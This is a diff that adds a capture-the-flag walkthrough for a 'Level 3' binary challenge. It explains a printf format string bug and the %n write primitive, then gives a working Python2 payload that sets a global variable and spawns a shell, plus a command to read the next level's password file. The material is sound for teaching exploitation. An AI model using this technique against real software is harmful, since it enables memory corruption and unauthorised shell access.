@@ -1,0 +1,185 @@
+# Level 3 Walkthrough
+
+## Goal
+
+Exploit a format string vulnerability to write the value `0x40` (64)
+into a global variable at `0x804988c`, triggering a `system()` call
+that spawns a shell.
+
+---
+
+## 1. Analyze the Binary
+
+```bash
+gdb ./level3
+(gdb) info functions
+(gdb) disas main
+(gdb) disas v
+```
+
+The decompiled logic looks like:
+
+```c
+int m = 0;  // global variable at 0x804988c
+
+void v() {
+    char buf[520];
+    fgets(buf, 520, stdin);
+    printf(buf);              // ← vulnerable line
+    if (m == 0x40) {
+        system("/bin/sh");
+    }
+}
+```
+
+The vulnerability is `printf(buf)` — user input passed **directly**
+as the format string with no format specifier.
+
+---
+
+## 2. The Vulnerability — Format String
+
+Safe usage:
+```c
+printf("%s", buf);   // buf treated as plain string
+```
+
+Vulnerable usage:
+```c
+printf(buf);         // buf treated as a format string
+```
+
+When you control the format string, you control what `printf` does.
+You can use format specifiers like `%x`, `%d`, `%n` and `printf`
+will act on them — reading or **writing** stack memory.
+
+---
+
+## 3. How `%n` Works
+
+`%n` is a special format specifier. Instead of printing something,
+it **writes** the number of bytes printed so far into a pointer
+argument.
+
+```c
+int x;
+printf("hello%n", &x);  // x = 5 (length of "hello")
+```
+
+We don't pass `&x` as an argument — we embed the **address itself**
+in the format string, then tell `printf` to treat it as a pointer
+with `%n`.
+
+---
+
+## 4. Finding the Position
+
+When `printf(buf)` runs, the stack looks like:
+
+```
+Stack (from printf's perspective)
+┌──────────────────┐
+│  arg1: buf ptr   │  ← position 1 (the format string itself)
+├──────────────────┤
+│  arg2: ...       │  ← position 2
+├──────────────────┤
+│  arg3: ...       │  ← position 3
+├──────────────────┤
+│  arg4: buf[0-3]  │  ← position 4 ← OUR INPUT STARTS HERE
+└──────────────────┘
+```
+
+Because `buf` is on the stack, the first bytes of our input
+appear at **position 4** from `printf`'s perspective.
+
+We can verify this by sending `AAAA%4$x` — if it prints `41414141`
+(hex for `AAAA`), our data is at position 4.
+
+`%4$n` means: "use argument at position 4 as the write target."
+We put our target address at the start of the input, so it sits
+exactly at position 4.
+
+---
+
+## 5. The Write Target
+
+```
+Global variable m is at 0x0804988c
+We need m == 0x40 == 64
+```
+
+We need to write exactly **64** into that address.
+
+---
+
+## 6. Payload Breakdown
+
+```
+[0x0804988c][%60x][%4$n]
+```
+
+Step by step:
+
+| Part | Bytes printed | Reason |
+|---|---|---|
+| `\x8c\x98\x04\x08` | 4 | the address itself, printed as raw bytes |
+| `%60x` | 60 | prints a hex value padded to 60 characters |
+| **Total** | **64 = 0x40** | this is what `%4$n` writes |
+
+`%4$n` then writes `64` into the address at position 4 — which
+is `0x0804988c` — the address we embedded at the start.
+
+---
+
+## 7. Exploit
+
+```bash
+(python2 -c 'import struct; print struct.pack("<I", 0x0804988c) + "%60x" + "%4$n"'; cat) | ./level3
+```
+
+---
+
+## 8. Execution Flow
+
+```
+Input arrives via fgets into buf
+     │
+printf(buf) executes with our payload as format string
+     │
+Prints 0x0804988c as 4 raw bytes        → 4 bytes printed so far
+     │
+%60x prints a stack value padded to 60  → 64 bytes printed so far
+     │
+%4$n fires:
+  reads position 4 off the stack = 0x0804988c
+  writes 64 into that address
+     │
+m = 0x40 now
+     │
+if (m == 0x40) check passes
+     │
+system("/bin/sh") executes
+     │
+Shell as level4
+```
+
+---
+
+## 9. Get the Password
+
+```bash
+cat /home/user/level4/.pass
+```
+
+---
+
+## Key Concepts
+
+| Concept | Meaning |
+|---|---|
+| **Format string bug** | User input used directly as `printf` format string |
+| **`%n`** | Writes bytes-printed-so-far into a pointer argument |
+| **`%4$n`** | Positional — targets the 4th argument specifically |
+| **Embedded address** | We put the target address in the input so it lands at position 4 |
+| **Byte counting** | 4 (address) + 60 (`%60x`) = 64 = `0x40` — controls what `%n` writes |
+| **Global variable** | Lives at a fixed address — not on the stack, not in libc — writable via `%n` |
